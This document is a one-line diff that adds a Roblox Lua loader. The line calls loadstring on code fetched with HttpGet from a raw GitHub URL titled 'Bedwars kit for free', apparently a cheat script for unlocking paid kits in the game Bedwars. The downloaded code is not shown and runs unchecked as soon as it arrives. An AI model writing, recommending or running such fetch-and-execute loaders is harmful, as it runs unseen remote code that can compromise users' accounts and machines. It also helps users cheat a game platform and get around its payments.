@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EncryptedByRollerV8/EncryptedByRollerV8/1ee7f662c8f3a7bb6a189751720eae93575f6411/Bedwars%20kit%20for%20free",true))();
